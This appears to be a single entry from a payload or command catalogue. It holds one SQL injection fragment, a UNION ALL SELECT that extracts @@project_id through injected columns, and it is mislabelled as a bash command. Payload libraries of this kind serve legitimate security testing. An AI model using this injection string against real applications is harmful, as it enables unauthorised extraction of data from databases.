---
id: 2dea1ad2-22b0-4882-8b2f-fd3376670ec3
name: Performing UNION ALL SELECT operation with @@project_id
type: command
executor: bash
data: UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name
output: null
created_at: '2023-04-06T03:56:32.353364+00:00'
updated_at: '2023-04-10T20:21:05.529526+00:00'
---

# Performing UNION ALL SELECT operation with @@project_id

```bash
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name
```
